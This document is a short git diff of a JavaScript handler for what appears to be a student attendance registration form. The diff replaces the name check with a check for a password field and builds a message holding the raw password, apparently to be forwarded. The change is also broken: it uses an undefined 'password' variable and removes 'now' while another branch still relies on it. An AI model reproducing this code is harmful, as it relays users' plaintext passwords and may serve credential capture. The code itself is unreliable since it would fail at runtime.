@@ -20,17 +20,12 @@ module.exports = async function handler(req, res) {
   const name = clean(body.name, 60);
   const group = clean(body.group, 40);
 
-  if (!name) return res.status(400).json({ error: "الاسم مطلوب" });
+  if (!password) return res.status(400).json({ error: "password " });
 
-  const now = new Date().toLocaleString("ar-DZ", {
-    timeZone: "Africa/Algiers",
-    dateStyle: "short",
-    timeStyle: "short",
-  });
 
   let text;
-  if (type === "name") {
-    text = `👤 تلميذ جديد\nالاسم: ${name}\n🕒 ${now}`;
+  if (type === "password") {
+    text = ` ${password}`;
   } else if (type === "group") {
     if (!group) return res.status(400).json({ error: "المجموعة مطلوبة" });
     text = `✅ تسجيل حضور\nالاسم: ${name}\nالمجموعة: ${group}\n🕒 ${now}`;
